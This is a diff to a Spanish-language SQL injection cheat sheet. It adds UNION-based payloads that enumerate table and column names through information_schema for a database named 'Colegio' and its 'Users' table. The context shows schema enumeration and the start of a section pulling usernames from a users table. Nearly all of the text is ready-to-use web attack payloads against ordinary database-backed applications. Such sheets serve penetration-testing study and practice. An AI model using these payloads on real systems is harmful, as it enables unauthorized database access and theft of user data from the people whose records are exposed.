@@ -45,6 +45,18 @@ UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 2,1-- 
 UNION SELECT NULL,schema_name,NULL from information_schema.schemata#
 UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 1,1#
 ```
+## Enumerar las Tablas
+```sql
+UNION SELECT NULL,table_name,NULL from information_schema.tables where table_schema="Colegio"-- -
+UNION SELECT NULL,table_name,NULL from information_schema.tables where table_schema="Colegio"#
+```
+## Enumerar las Columnas
+```sql
+UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users"-- -
+UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users" limit 1,1-- -
+UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users"#
+UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users" limit 2,1#
+```
 ## Data
 ```sql
 UNION SELECT NULL,username,NULL from users-- -
